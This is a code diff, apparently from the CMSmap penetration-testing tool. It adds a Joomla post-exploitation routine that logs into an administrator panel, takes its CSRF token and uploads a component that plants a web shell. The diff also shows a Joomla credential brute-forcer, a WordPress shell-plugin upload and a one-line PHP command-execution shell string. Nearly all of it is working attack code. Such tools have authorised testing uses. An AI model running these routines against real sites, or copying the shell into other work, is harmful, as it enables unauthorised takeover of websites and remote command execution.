@@ -823,7 +823,7 @@ class BruteForcer:
                     try:
                         htmltext = opener.open(self.url+self.joologin, data).read()
                         if re.findall(re.compile('Joomla - Administration - Control Panel'),htmltext):
-                            print "[*] Valid Credentials: "+user+" "+pwd
+                            print_red("[*] Valid Credentials: "+user+" "+pwd)
                             self.JooValidCredentials.append([user,pwd])
                     except urllib2.HTTPError, e:
                         #print e.code
@@ -874,7 +874,7 @@ class PostExploit:
             htmltext = opener.open(self.url+self.wppluginpage).read()
             self.wpnonce = re.findall(re.compile('name="_wpnonce" value="(.+?)"'),htmltext) 
             # Upload Plugin
-            self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
+            self.params = { "_wpnonce" : self.wpnonce[0],"pluginzip" : open("shell/wp-shell.zip", "rb") , "install-plugin-submit":"Install Now"}
             htmltext = opener.open(self.url+self.wpupload, self.params).read()
             if re.search("Plugin installed successfully",htmltext):
                 print_red("[!] CMSmap WordPress Shell Plugin Installed")
@@ -937,6 +937,42 @@ class PostExploit:
             pass
         
     def JooShell(self,user,password):
+        self.joologin = "/administrator/index.php"
+        self.jooupload = "/administrator/index.php?option=com_installer&view=install"
+        self.jooThemePage = "/administrator/index.php?option=com_templates"
+        # Set cookies
+        cookieJar = cookielib.CookieJar()
+        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
+        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
+        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
+        cookieJar.clear()
+        try:
+            # HTTP POST Request
+            if verbose : print "[-] Logging in the target website ..."
+            # Get Token and Session Cookie
+            htmltext = opener.open(self.url+self.joologin).read()
+            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
+            self.token = reg.search(htmltext).group(1)     
+            # Logining on the website with username and password
+            self.query_args_login = {"username": user ,"passwd": password, "option":"com_login","task":"login",self.token:"1"}
+            data = urllib.urlencode(self.query_args_login)
+            htmltext = opener.open(self.url+self.joologin, data).read()
+            # Get Token in Upload Page
+            htmltext = opener.open(self.url+self.jooupload).read()
+            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
+            self.token = reg.search(htmltext).group(1) 
+            # Upload Component
+            self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
+            htmltext = opener.open(self.url+self.jooupload, self.params).read()
+            if re.search("Installing component was successful.",htmltext):
+                print_red("[!] CMSmap Joomla Shell Plugin Installed")
+                print_red_bold("[!] Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php")
+                print_yellow("[-] Remember to unistall CMSmap Joomla Shell Component")
+        except urllib2.HTTPError, e:
+            # print e.code
+            pass
+
+    def JooWritableTemplate(self,user,password):
         self.joologin = "/administrator/index.php"
         self.jooThemePage = "/administrator/index.php?option=com_templates"
         self.shell = "<?=@`$_GET[c]`;?>"
